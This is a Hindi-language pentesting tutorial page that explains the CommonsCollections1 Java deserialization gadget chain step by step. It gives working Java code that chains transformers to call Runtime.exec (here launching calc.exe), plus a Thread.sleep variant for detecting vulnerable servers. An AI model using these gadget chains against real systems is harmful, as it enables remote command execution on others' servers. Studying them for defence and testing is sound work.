# CommonsCollection1 Payload - Java Transformers to Rutime exec() और Thread Sleep

{{#include ../../banners/hacktricks-training.md}}

## Java Transformers to Rutime exec()

कई स्थानों पर आप एक java deserialization payload पा सकते हैं जो Apache common collections से transformers का उपयोग करता है जैसे कि निम्नलिखित:
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
यदि आपको जावा डेसिरियलाइजेशन पेलोड के बारे में कुछ नहीं पता है, तो यह समझना मुश्किल हो सकता है कि यह कोड कैलकुलेटर को क्यों चलाएगा।

सबसे पहले, आपको यह जानने की आवश्यकता है कि **Transformer in Java** कुछ ऐसा है जो **एक क्लास को प्राप्त करता है** और **इसे एक अलग क्लास में बदलता है**।\
यह जानना भी दिलचस्प है कि यहाँ **executed** हो रहा **payload** **equivalent** है:
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
या **और अधिक सटीक रूप से**, अंत में क्या निष्पादित किया जाएगा:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### कैसे

तो, पहला payload कैसे उन "सरल" एक-लाइनर्स के बराबर प्रस्तुत किया गया है?

**पहले** आप payload में देख सकते हैं कि एक **transform का एक श्रृंखला (array) बनाई गई है**:
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
यदि आप कोड पढ़ते हैं, तो आप देखेंगे कि यदि आप किसी तरह से ऐरे के परिवर्तन को श्रृंखला में जोड़ते हैं, तो आप मनमाने कमांड निष्पादित करने में सक्षम हो सकते हैं।

तो, **वे परिवर्तन कैसे श्रृंखला में जोड़े जाते हैं?**
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
पेलोड के अंतिम अनुभाग में आप देख सकते हैं कि एक **Map ऑब्जेक्ट बनाया गया है**। फिर, `LazyMap` से `decorate` फ़ंक्शन को मैप ऑब्जेक्ट और चेन किए गए ट्रांसफार्मर्स के साथ निष्पादित किया जाता है। निम्नलिखित कोड से आप देख सकते हैं कि यह **चेन किए गए ट्रांसफार्मर्स** को `lazyMap.factory` विशेषता के अंदर कॉपी करने का कारण बनेगा:
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
और फिर महान समापन निष्पादित होता है: `lazyMap.get("anything");`

यह `get` फ़ंक्शन का कोड है:
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
और यह `transform` फ़ंक्शन का कोड है
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
तो, याद रखें कि **factory** के अंदर हमने **`chainedTransformer`** को सहेजा था और **`transform`** फ़ंक्शन के अंदर हम **सभी उन ट्रांसफार्मर्स को चेन में ले जा रहे हैं** और एक के बाद एक निष्पादित कर रहे हैं। मजेदार बात यह है कि **प्रत्येक ट्रांसफार्मर `object`** **को इनपुट के रूप में उपयोग कर रहा है** और **object अंतिम निष्पादित ट्रांसफार्मर से आउटपुट है**। इसलिए, **सभी ट्रांसफॉर्म चेन में दुर्भावनापूर्ण पेलोड को निष्पादित कर रहे हैं**।

### सारांश

अंत में, यह देखते हुए कि lazyMap कैसे get विधि के अंदर चेन किए गए ट्रांसफार्मर्स को प्रबंधित कर रहा है, यह ऐसा है जैसे हम निम्नलिखित कोड को निष्पादित कर रहे हैं:
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_ध्यान दें कि `value` प्रत्येक ट्रांसफॉर्म का इनपुट और पिछले ट्रांसफॉर्म का आउटपुट है, जो एक-लाइनर के निष्पादन की अनुमति देता है:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
यहाँ **गैजेट्स** को समझाया गया था जो **ComonsCollections1** पेलोड के लिए उपयोग किए जाते हैं। लेकिन यह छोड़ दिया गया है **कि यह सब कैसे शुरू होता है और यह कैसे निष्पादित होता है**। आप [यहाँ देख सकते हैं कि **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java), इस पेलोड को निष्पादित करने के लिए, एक `AnnotationInvocationHandler` ऑब्जेक्ट का उपयोग करता है क्योंकि **जब यह ऑब्जेक्ट डीसिरियलाइज होता है**, यह `payload.get()` फ़ंक्शन को **निष्पादित** करेगा जो **पूरे पेलोड को निष्पादित करेगा**।

## Java Thread Sleep

यह पेलोड **यह पहचानने के लिए उपयोगी हो सकता है कि क्या वेब कमजोर है क्योंकि यह निष्पादित होने पर एक स्लीप करेगा**।
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## अधिक गैजेट्स

आप अधिक गैजेट्स यहाँ पा सकते हैं: [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

{{#include ../../banners/hacktricks-training.md}}
